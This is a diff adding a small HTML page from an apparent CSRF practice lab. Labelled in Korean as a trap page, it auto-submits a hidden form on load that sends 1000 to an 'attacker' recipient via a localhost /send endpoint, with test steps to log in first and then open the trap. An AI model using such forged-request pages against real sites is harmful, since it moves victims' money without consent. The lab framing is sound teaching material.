@@ -1,0 +1,25 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF 실습</title>
+  </head>
+  <body>
+    <form id="send" action="http://localhost:3000/send" method="post">
+      <input type="text" name="to" value="공격자" />
+      <input type="text" name="amount" value="1000" />
+    </form>
+
+    <script>
+      document.querySelector("#send").submit();
+    </script>
+  </body>
+</html>
+
+<!-- 
+
+테스트 순서
+1. login.html에서 로그인
+2. trap.html로 이동
+ 
+-->
